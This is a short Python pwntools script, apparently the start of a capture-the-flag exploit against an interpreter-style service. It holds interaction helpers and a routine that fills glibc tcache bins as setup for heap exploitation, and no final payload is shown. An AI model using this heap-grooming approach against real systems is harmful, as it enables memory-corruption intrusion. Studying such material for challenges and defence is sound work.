#!/usr/bin/env python3
from pwn import *


def run_code(io, code_size, code, buffer_size, talk, nowait=False):
    io.recvuntil('code size = ')
    io.sendline(str(code_size))
    io.recvuntil('code = ')
    io.sendline(code)
    io.recvuntil('buffer size = ')
    io.sendline(str(buffer_size))
    io.recvuntil('[+] Running...\n')
    talk(io)
    if nowait:
        return None
    suffix = b'\n[+] Done!\n'
    output = io.recvuntil(suffix)
    assert output.endswith(suffix)
    io.send(' ')
    return output[:-len(suffix)]


def dont_talk():
    def result(io):
        pass

    return result


def send(sequence):
    def result(io):
        return io.send(sequence)

    return result


def fill_tcache_bins(io, size):
    run_code(io, size, b'+', size, dont_talk())  # 3
    run_code(io, size, b'+', size, dont_talk())  # 6
    run_code(io, 0x10, b'+', size, dont_talk())  # 7


